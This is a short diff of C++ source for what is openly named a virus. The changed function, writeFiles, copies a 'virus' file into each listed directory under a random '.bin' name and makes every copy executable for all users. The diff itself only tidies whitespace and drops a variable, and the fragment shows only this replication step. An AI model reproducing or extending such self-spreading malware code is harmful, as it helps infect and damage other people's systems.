@@ -76,10 +76,10 @@ void writeFiles(std::vector<std::string> files)
          nameVirus= (files[i] + "/a" + std::to_string(rand()) + ".bin");
           // get the file
           std::ifstream fileVirus(file);
-          // create the file
-          
+          // create the file          
           std::ofstream copyVirus(nameVirus);
-          std::string virusString;
+
+          
           chmod(nameVirus.c_str(), S_IRWXU | S_IRWXG | S_IRWXG | S_IRWXO);
           copyVirus << fileVirus.rdbuf(); // copy the file
               
